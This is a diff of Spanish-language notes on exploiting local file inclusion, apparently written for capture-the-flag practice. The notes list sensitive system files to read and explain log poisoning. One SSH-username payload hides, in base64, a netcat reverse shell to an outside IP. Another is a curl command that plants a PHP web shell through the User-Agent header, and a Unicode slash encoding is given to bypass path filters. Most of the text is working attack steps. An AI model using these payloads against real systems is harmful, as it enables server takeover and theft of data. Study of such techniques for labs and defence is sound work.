@@ -22,7 +22,7 @@ esta es una vulnerabilidad la cual se suele dar en paginas cuya url llama a algu
 
 para poder ver algunas rutas podemos cambiar el destino y en vez de poner login.php podemos poner cualquier archivo del sistema.
 
-```
+
 
       rutas peligrosas en local file inclusion:
       /etc/passwd filtrar por grep = $sh (para ver los usurarios)
@@ -32,23 +32,23 @@ para poder ver algunas rutas podemos cambiar el destino y en vez de poner login.
 
 
 
-'''
+
 
 una vez que hemos descubierto la vulnerabilidad , para explotarla podemos acceder a estas rutas peligrosas
 
-'''
+
 
      otra ruta peligrosa es
     /proc/sched_debug (enumeracion de los progresos del sistema)
     /proc/net/fib_trie (direcciones ip)
     /var/log/auth.log (todos los logs del sistema)
 
-'''
+
 
 ahora vamos a explotar el poder leer el archivo auth.log
 
 
-'''
+
 
 
 
@@ -64,13 +64,13 @@ ahora vamos a explotar el poder leer el archivo auth.log
      ssh <?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK | base64 -d | bash
      "); ?> @10.10.105.17 
 
-'''
+
 
 si no encotramos el archivo o el firewall nos rechaza la conexio podemos probrar a buscar el archivo /var/log/apache2/a>
 una vez aqui podemos modificar el user agent con curl para ejecutar comandos:
 
 
-'''
+
 
 
     si no encotramos el archivo o el firewall nos rechaza la conexio podemos probrar a buscar el archivo /var/log/apache2/a>
@@ -80,13 +80,13 @@ una vez aqui podemos modificar el user agent con curl para ejecutar comandos:
     esto no ejecutara el comando que especificamos en system("") en este caso para ver si podremos obtener una shell con netcat
 
 
-'''
+
 
 
 esta seria otra forma
 
 
-'''
+
 
 
 
@@ -96,7 +96,7 @@ esta seria otra forma
      curl "http://example.htb -H "User-Agent : <?php system(\$_GET['bash']); ?>"
 
 
-'''
+
 
 algunas paginas utilizan filtros a la hora de filtrar los strings /../ asi que podemos utilizar este:
 %ef%bc%8f
